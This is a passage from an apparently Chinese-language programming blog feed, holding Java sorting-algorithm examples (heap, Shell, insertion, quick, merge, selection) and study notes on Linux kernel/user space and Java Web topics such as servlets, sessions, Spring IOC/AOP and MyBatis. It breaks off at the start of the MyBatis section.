helper(nums, nums.length, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> len, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; len) &#123;</span><br><span class="line">            <span class="keyword">int</span> largest = k;</span><br><span class="line">            <span class="keyword">if</span> (k * <span class="number">2</span> + <span class="number">1</span> &lt; len &amp;&amp; nums[largest] &lt; nums[k * <span class="number">2</span> + <span class="number">1</span>]) &#123;</span><br><span class="line">                largest = k * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k * <span class="number">2</span> + <span class="number">2</span> &lt; len &amp;&amp; nums[largest] &lt; nums[k * <span class="number">2</span> + <span class="number">2</span>]) &#123;</span><br><span class="line">                largest = k * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k == largest) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> tmp = nums[largest];</span><br><span class="line">            nums[largest] = nums[k];</span><br><span class="line">            nums[k] = tmp;</span><br><span class="line"></span><br><span class="line">            k = largest;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 20:03</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 希尔排序</span></span><br><span class="line"><span class="comment"> * o(n^1.5)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">insertShell</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">int</span> len = n / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (len &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - len; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[j] &gt; nums[j + len]) &#123;</span><br><span class="line">                        <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                        nums[j] = nums[j + len];</span><br><span class="line">                        nums[j + len] = tmp;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            len /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        insertSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 19:52</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 直接插入排序，当前位置与它前面的数字比较，看插入哪一个位置</span></span><br><span class="line"><span class="comment"> * o(n^2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">insertSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                    nums[j] = nums[j + <span class="number">1</span>];</span><br><span class="line">                    nums[j + <span class="number">1</span>] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        insertSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by hta on 17-5-5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        quickSort(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            System.out.println(num);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left = start;</span><br><span class="line">        <span class="keyword">int</span> right = end;</span><br><span class="line">        <span class="keyword">int</span> pivot = nums[(start + end) / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; nums[left] &lt; pivot) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; nums[right] &gt; pivot) &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt;= right) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = nums[left];</span><br><span class="line">                nums[left] = nums[right];</span><br><span class="line">                nums[right] = temp;</span><br><span class="line">                left++;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        quickSort(nums, start, right);</span><br><span class="line">        quickSort(nums, left, end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: hta</span></span><br><span class="line"><span class="comment"> * since: 上午10:45 17-5-6</span></span><br><span class="line"><span class="comment"> * time: O(nlogn)</span></span><br><span class="line"><span class="comment"> * param: int[] nums, int[] temp, int start, int end</span></span><br><span class="line"><span class="comment"> * return: void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mergeSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">55</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        mergeSort(nums, temp, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            System.out.println(num);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span>[] temp, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left = start;</span><br><span class="line">        <span class="keyword">int</span> right = end;</span><br><span class="line">        <span class="keyword">int</span> mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        mergeSort(nums, temp, left, mid);</span><br><span class="line">        mergeSort(nums, temp, mid + <span class="number">1</span>, right);</span><br><span class="line">        merge(nums, temp, start, mid, end);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span>[] temp, <span class="keyword">int</span> start, <span class="keyword">int</span> mid, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> leftIndex = start;</span><br><span class="line">        <span class="keyword">int</span> rightIndex = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> index = start;</span><br><span class="line">        <span class="keyword">while</span> (leftIndex &lt;= mid &amp;&amp; rightIndex &lt;= end) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[leftIndex] &lt;= nums[rightIndex]) &#123;</span><br><span class="line">                temp[index++] = nums[leftIndex++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                temp[index++] = nums[rightIndex++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (leftIndex &lt;= mid) &#123;</span><br><span class="line">            temp[index++] = nums[leftIndex++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (rightIndex &lt;= end) &#123;</span><br><span class="line">            temp[index++] = nums[rightIndex++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">            nums[i] = temp[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 20:59</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 简单选择排序</span></span><br><span class="line"><span class="comment"> * o(n^2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">selectSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> min = nums[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; min) &#123;</span><br><span class="line">                    <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                    nums[j] = min;</span><br><span class="line">                    min = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[i] = min;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        selectSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> sort </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统</title>
      <link href="/system-summary/"/>
      <url>/system-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="linux内核空间和用户空间详解"><a class="markdownIt-Anchor" href="#linux内核空间和用户空间详解"></a> Linux内核空间和用户空间详解</h2><h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><p>Linux简化了分段机制，使得虚拟地址与线性地址总是一致，因此，Linux的虚拟地址空间也为0~4G。Linux内核将这4G字节的空间分为两部分。**将较高的1G字节（从虚拟地址0xC0000000到0xFFFFFFFF），供内核使用，称为“内核空间”。而将较低的3G字节（从虚拟地址 0x00000000到0xBFFFFFFF），供各个进程使用，称为“用户空间”。**因为各个进程可以通过系统调用进入内核，因此，Linux内核是系统内的所有进程共享。于是，从具体进程的角度来看，每个进程可以拥有4G字节的虚拟空间。</p><p>**Linux使用两级保护机制：0级供内核使用，3级供用户程序使用。**每个进程有各自的私有用户空间（0~3G），这个空间对系统中的其他进程是不可见的。最高的1GB字节虚拟内核空间则为所有进程以及内核所共享。</p><blockquote><p>内核空间中存放的是内核代码和数据，而进程的用户空间中存放的是用户程序的代码和数据。不管是内核空间还是用户空间，它们都处于虚拟空间中。</p></blockquote><p>虽然内核空间占据了每个虚拟空间中的最高1GB字节，但映射到物理内存却总是从最低地址（0x00000000）开始。对内核空间来说，其地址映射是很简单的线性映射，0xC0000000就是物理地址与线性地址之间的位移量，在Linux代码中就叫做PAGE_OFFSET。</p><p><strong>常见问题：</strong></p><ol><li>内核空间和用户空间之间如何进行通讯？<br />一般通过系统调用进行通信</li><li>如何判断一个驱动是用户模式还是内核模式驱动？判断的标志是什么？<br />用户空间模式的驱动一般通过系统调用来完成对硬件的访问，如通过系统调用将驱动的io空间映射到用户空间等。<strong>因此，主要的判断依据就是系统调用。</strong></li></ol><h3 id="内核态和用户态"><a class="markdownIt-Anchor" href="#内核态和用户态"></a> 内核态和用户态</h3><p>当一个任务（进程）执行系统调用而陷入内核代码中执行时，我们就称进程处于内核运行态（或简称为内核态）。此时处理器处于特权级最高的（0级）内核代码中执行。当进程处于内核态时，执行的内核代码会使用当前进程的内核栈。每个进程都有自己的内核栈。当进程在执行用户自己的代码时，则称其处于用户运行态（用户态）。即此时处理器在特权级最低的（3级）用户代码中运行。当正在执行用户程序而突然被中断程序中断时，此时用户程序也可以象征性地称为处于进程的内核态。因为中断处理程序将使用当前进程的内核栈。这与处于内核态的进程的状态有些类似。</p><h3 id="进程上下文和中断上下文"><a class="markdownIt-Anchor" href="#进程上下文和中断上下文"></a> 进程上下文和中断上下文</h3><p>处理器总处于以下状态中的一种：</p><ol><li>内核态，运行于进程上下文，内核代表进程运行于内核空间；</li><li>内核态，运行于中断上下文，内核代表硬件运行于内核空间；</li><li>用户态，运行于用户空间。<br />用户空间的应用程序，通过系统调用，进入内核空间。这个时候用户空间的进程要传递很多变量、参数的值给内核，内核态运行的时候也要保存用户进程的一些寄存器值、变量等。所谓的“进程上下文”，可以看作是用户进程传递给内核的这些参数以及内核要保存的那一整套的变量和寄存器值和当时的环境等。<br />硬件通过触发信号，导致内核调用中断处理程序，进入内核空间。这个过程中，硬件的一些变量和参数也要传递给内核，内核通过这些参数进行中断处理。所谓的“中断上下文”，其实也可以看作就是硬件传递过来的这些参数和内核需要保存的一些其他环境（主要是当前被打断执行的进程环境）。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web总结</title>
      <link href="/java-web-summary/"/>
      <url>/java-web-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="jsp与servlet的区别"><a class="markdownIt-Anchor" href="#jsp与servlet的区别"></a> JSP与Servlet的区别</h2><p><img src="https://upload-images.jianshu.io/upload_images/4470227-0a534057cd017476.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="JSP与Servlet的区别" /></p><h2 id="servlet的生命周期"><a class="markdownIt-Anchor" href="#servlet的生命周期"></a> Servlet的生命周期</h2><p><img src="https://upload-images.jianshu.io/upload_images/4470227-97577b81f28db8d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Servlet的接口" /></p><p>前三个方法与Servlet的生命周期相关，Web容器加载Servlet并将其实例化之后，Servlet的生命周期开始，容器运行其init()方法进行Servlet的初始化；请求到达时调用Servlet的service()方法，service()方法根据需要调用与请求相对应的doGet()或doPost()方法；当服务器关闭或项目被卸载时服务器会将Servlet实例销毁，此时会调用destroy()方法</p><h2 id="如何保持会话状态有哪些方式区别如何"><a class="markdownIt-Anchor" href="#如何保持会话状态有哪些方式区别如何"></a> 如何保持会话状态，有哪些方式，区别如何？</h2><ul><li>URL重写：在URL中添加用户会话的信息作为请求的参数，或者将唯一的会话ID添加到URL结尾以表示一个会话</li><li>设置表单隐藏域：将和会话跟踪相关的字段添加到隐藏表单域中，这些信息不回在浏览器中显示但是在提交表单时会提交给服务器</li></ul><p>以上两种方式都比较难以处理跨越多个页面的信息传递，因为如果每次都要修改URL或者在页面添加隐藏表单域来存储用户会话相关的信息，会变得比较复杂。</p><p>HTML5中可以使用<code>Web Storage</code>技术通过JavaScript来保持数据，例如可以使用<code>localStorage</code>和<code>sessionStorage</code>来保存用户会话的信息，它能够实现会话跟踪</p><h2 id="cookie和session的区别"><a class="markdownIt-Anchor" href="#cookie和session的区别"></a> cookie和session的区别</h2><p>由于http协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是session。这个session是保存在服务端的，有一个唯一标识。在服务端保存session的方法有很多，内存、数据库、文件都可以。</p><p>每次http请求的时候，客户端都会发送相应的cookie信息到服务端，实际上大多数的应用都是用cookie来实现session跟踪的，第一次创建session的时候，服务端会在http协议中告诉客户端，需要在cookie里面记录一个session id，以后每次请求把这个会话id发送到服务器。</p><p>如果客户端浏览器禁用了cookie，在这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次http请求，URL后面都会附上一个诸如sid=xxx这样的参数，服务端据此来标识用户。</p><p><em>总结：Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</em></p><h2 id="spring-ioc和aop"><a class="markdownIt-Anchor" href="#spring-ioc和aop"></a> Spring IOC和AOP</h2><h3 id="spring-ioc"><a class="markdownIt-Anchor" href="#spring-ioc"></a> Spring IOC</h3><p>IOC叫控制反转，是Inversion of Control的缩写，DI(Dependency Injection)叫依赖注入，是对IOC更简单的诠释。**控制反转是把传统上由程序代码直接操控的对象调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的控制反转就是对组件对象控制权的转移，从程序代码本身转移到了外部容器，由容器来创建并管理对象之间的依赖关系。**DI是对IOC更准确的描述，即组件之间的依赖关系由容器在运行期间决定，形象的来说，即由容器动态的将某种依赖关系注入到组件之中。</p><p>举个例子：类A需要用到接口B中的方法，那么就需要类A与接口B建立关联或者依赖关系，最原始的方法就在在类A创建接口B的实现类C的实例，但**这种方法要求开发人员自行维护两者的依赖关系，即当依赖关系需要改变的时候需要修改代码并重新构建整个系统。**如果通过一个容器来管理这些对象的依赖关系，只需要在类A中定义好用于管理接口B的方法（构造器或者setter方法），将类A与接口B的实现类C放入容器，通过对容器的配置来实现两者的关系。</p><p><img src="https://upload-images.jianshu.io/upload_images/4470227-a64e35eed50bf438.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Spring IOC实现原理" /></p><h3 id="spring-aop"><a class="markdownIt-Anchor" href="#spring-aop"></a> Spring AOP</h3><p>AOP(Aspect-Oriented Programming)指一种程序设计范式，该范式以一种称为切面（aspect）的语言构造为基础，**切面是一种新的模块化机制，用来描述分散在对象、类或方法中的横切关注点。**通常，事务、日志、安全性等关注就是应用中的横切关注功能。</p><p><img src="https://upload-images.jianshu.io/upload_images/4470227-12d2458a61189eec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Spring+AOP实现原理" /></p><h3 id="ioc容器的加载过程"><a class="markdownIt-Anchor" href="#ioc容器的加载过程"></a> IOC容器的加载过程</h3><ul><li>创建IOC配置文件的抽象资源</li><li>创建一个BeanFactory</li><li>把读取配置信息的BeanDefinitionReader，这里是XmlBeanDefinitionReader配置给BeanFactory</li><li>把定义好的资源位置读入配置信息，具体解析过程有XmlBeanDefinitionReader来完成，这样完成整个载入bean定义的过程</li></ul><h3 id="动态代理与cglib实现的区别"><a class="markdownIt-Anchor" href="#动态代理与cglib实现的区别"></a> 动态代理与cglib实现的区别</h3><ul><li>JDK动态代理只能对实现了接口的类生成代理，而不能针对类</li><li>CGLIB是针对类实现代理，主要是对指定的类生成了一个子类，覆盖其中的方法。因为是继承，<strong>所以该类或方法最好不要声明成final</strong></li><li>JDK代理是不需要第三方库，只要JDK环境就可以进行代理</li><li>CGLib必须依赖于CGLib的类库，但是它需要类来实现任何接口代理的是指定的类生成一个子类，覆盖其中的方法，是一种继承</li></ul><h2 id="spring-mvc的原理"><a class="markdownIt-Anchor" href="#spring-mvc的原理"></a> Spring MVC的原理</h2><p><img src="http://img.blog.csdn.net/20160427094830780" alt="" /><br />Spring MVC主要由DispatcherServlet、处理器映射、处理器（控制器）、视图解析器、视图组成。两个核心是：</p><ul><li>**处理器映射：**选择使用哪个控制器来处理请求</li><li>**视图解析器：**选择结果应该如何渲染</li></ul><p>通过以上两点，Spring MVC保证了如何选择控制处理请求和如何选择视图展现输出之间的松耦合。<br /><img src="https://upload-images.jianshu.io/upload_images/4470227-f4c2db4b9765ec49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Spring MVC运行原理" /></p><h2 id="mybatis"><a class="markdownIt-Anchor" href="#mybatis"></a> Mybatis</h2><h3 id="和的区别是什么"><a class="markdownIt-Anchor" href="#和的区别是什么"></a> #{}和${}的区别是什么？</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#&#123;&#125;是预编译处理，$&#123;&#125;是字符串替换</span><br><span 